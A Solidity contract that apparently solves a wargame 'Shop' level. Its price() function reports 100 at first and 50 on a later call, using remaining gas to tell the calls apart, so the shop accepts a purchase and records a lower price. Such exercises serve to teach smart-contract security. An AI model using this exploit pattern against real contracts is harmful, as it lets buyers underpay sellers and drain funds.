// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract Level21 is Buyer {
    Shop shop;

    constructor(address shopAddr) public {
        shop = Shop(shopAddr);
    }

    function main() public {
        shop.buy();
    }

    function price() external view override returns (uint256) {
        if (gasleft() < 100000) {
            return 50;
        }

        return 100;
    }
}
